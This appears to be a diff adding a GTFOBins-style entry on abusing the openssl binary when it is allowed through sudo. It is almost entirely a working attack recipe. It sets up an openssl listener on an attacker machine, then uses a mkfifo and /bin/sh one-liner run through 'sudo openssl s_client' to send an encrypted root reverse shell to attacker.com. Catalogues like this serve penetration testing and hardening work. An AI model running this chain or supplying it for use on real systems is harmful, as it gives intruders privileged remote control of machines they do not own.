@@ -1,0 +1,13 @@
+***** Sudo *****
+If the binary is allowed to run as superuser by sudo, it does not drop the
+elevated privileges and may be used to access the file system, escalate or
+maintain privileged access.
+    * To receive the shell run the following on the attacker box:
+      openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days
+      365 -nodes
+      openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
+      Communication between attacker and target will be encrypted.
+      RHOST=attacker.com
+      RPORT=12345
+      mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -
+      connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
